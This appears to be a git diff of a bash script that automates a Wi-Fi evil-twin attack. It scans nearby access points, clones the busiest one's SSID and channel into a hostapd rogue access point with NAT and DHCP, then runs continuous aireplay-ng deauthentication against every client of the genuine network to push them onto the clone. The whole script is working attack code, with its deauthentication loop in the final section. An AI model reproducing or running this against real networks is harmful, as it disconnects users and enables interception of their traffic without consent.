@@ -1,22 +1,26 @@
 #!/bin/bash
 # Scan all AP around us
-interface="$1"
+interface="$1" #wlan0
+monitor_interface="$2" #wlan0mon
 
 clear
 
 sudo airmon-ng check kill
 
-sudo airmon-ng start wlan0 
+sudo systemctl restart NetworkManager
 
-sudo timeout -s 2 15 airodump-ng wlan0mon -w psk & echo "DEBUG" & sleep 16
+sudo airmon-ng start $interface
 
-sudo rm psk-01.cap & sudo rm psk-01.csv & sudo rm psk-01.kismet.netxml
+sudo timeout -s 2 25 airodump-ng $monitor_interface -w scan & sleep 26
+
+sudo rm scan-01.cap & sudo rm scan-01.csv & sudo rm scan-01.kismet.netxml
 
 maxData=0
 finalName=""
-finalSSID=""
+finalMAC=""
+finalChannel=0
 
-input="psk-01.kismet.csv"
+input="scan-01.kismet.csv"
 #Delete first line of the file (without data)
 sed -i '1d' $input
 #Read each line
@@ -28,7 +32,8 @@ do
   if [ "${ARRAY[13]}" -gt "$maxData" ] ; then
     maxData="${ARRAY[13]}"
     finalName="${ARRAY[2]}"
-    finalSSID="${ARRAY[3]}"
+    finalMAC="${ARRAY[3]}"
+    finalChannel="${ARRAY[5]}"
 
   fi
 
@@ -37,25 +42,56 @@ done < "$input"
 
 echo "$maxData"
 echo "$finalName"
-echo "$finalSSID"
+echo "$finalMAC"
 
-# Creation of our AP 
-sudo airmon-ng stop wlan0mon
+# Creation of our AP
+sudo airmon-ng stop $monitor_interface
 
 sed -i "5s/.*/ssid="$finalName"/" hostconf.conf
 
-sudo echo 1 > sudo /proc/sys/net/ipv4/ip_forward
+
+number=1
+
+sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
+cat /proc/sys/net/ipv4/ip_forward
 echo "Echo 1 OK"
 
+#Setup internet route for user
 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
 echo "iptables OK"
 
-sudo ip addr add 192.168.1.1/24 dev wlan0
+#Add ip to WLan0
+sudo ip addr add 192.168.1.1/24 dev $interface
 echo "ip add OK"
 
 sudo gnome-terminal -- bash -c "sudo hostapd /home/mike/Documents/Secu/hostconf.conf ; exec bash"
 
-sudo dnsmasq -d -C host.conf
+sudo rm scan-01.kismet.csv
+sudo rm scan-01.log
 
-sudo rm psk-01.kismet.csv
+sudo gnome-terminal -- bash -c "sudo dnsmasq -d -C host.conf ; exec bash"
+
+#Deauth all users of the selected AP until the end of the script
+
+sudo airmon-ng start $interface
+
+sudo timeout -s 2 80 airodump-ng $monitor_interface --bssid $finalMAC -a -w device & sleep 81
+
+sed -i '1,5d' device-01.csv
+
+sed -i "7s/.*/channel="$finalChannel"/" hostconf.conf
+
+sudo airmon-ng stop $interface
+
+sudo airmon-ng start $interface
+
+while IFS= read -r line
+do
+  #Parse the given line and put every datas in an array
+  IFS=',' read -ra ARRAY <<< "$line"
+
+  sudo gnome-terminal -- bash -c "aireplay-ng --deauth 0 -a $finalMAC -c ${ARRAY[0]} $monitor_interface ; exec bash"
+
+
+done < "device-01.csv"
 
